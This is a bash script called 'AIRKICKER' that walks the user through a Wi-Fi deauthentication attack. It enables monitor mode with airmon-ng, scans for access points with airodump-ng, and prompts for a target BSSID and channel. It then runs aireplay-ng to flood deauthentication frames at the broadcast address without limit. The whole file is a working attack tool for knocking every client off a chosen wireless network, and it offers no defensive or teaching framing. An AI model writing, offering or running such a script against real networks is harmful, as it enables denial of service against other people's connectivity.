#!/bin/bash
./figlet -f slant "AIRKICKER"
echo -e "\033[1;34m[*] Granting root permission...\033[0m"
sudo echo -e "\033[1;36m[+] Root permission granted!\033[0m"

sudo airmon-ng
echo -n "[?] Interface name: "
read ifn
echo "ifn => $ifn"
sudo airmon-ng start ${ifn}

echo -e "\033[1;34m[+] Searching for sources in 3 seconds, press CTRL-C to stop\033[0m"
sleep 3

sudo airodump-ng ${ifn}mon
echo -e "\033[1;34m[+] Done!... Please enter source details\033[0m"
echo -n "[?] Source BSSID: "
read bssid
echo "bssid => $bssid"
echo -n "[?] Source channel: "
read channel
echo "channel => $channel"

echo -e "\033[1;34m[+] Testing source effectiveness in 3 seconds, press CTRL-C to stop\033[0m"
sleep 3
sudo airodump-ng --bssid $bssid -c $channel ${ifn}mon

echo -e "\033[1;34m[+] Targeting source clients in 3 seconds, press CTRL-C to stop\033[0m"
sleep 3
echo -e "\033[1;34m[*] Running...\033[0m"
sudo aireplay-ng -0 0 -a $bssid -c FF:FF:FF:FF:FF:FF ${ifn}mon


